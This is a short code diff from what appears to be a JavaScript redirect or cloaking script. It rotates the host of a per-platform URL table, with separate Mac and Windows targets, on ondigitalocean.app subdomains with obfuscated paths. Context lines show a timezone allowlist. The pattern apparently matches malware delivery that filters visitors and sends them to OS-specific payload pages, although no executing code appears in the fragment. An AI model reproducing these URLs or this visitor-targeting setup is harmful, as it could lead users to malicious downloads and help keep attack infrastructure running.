@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://do-app-eztht.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://do-app-eztht.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://quit-app-n9zqb.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://quit-app-n9zqb.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
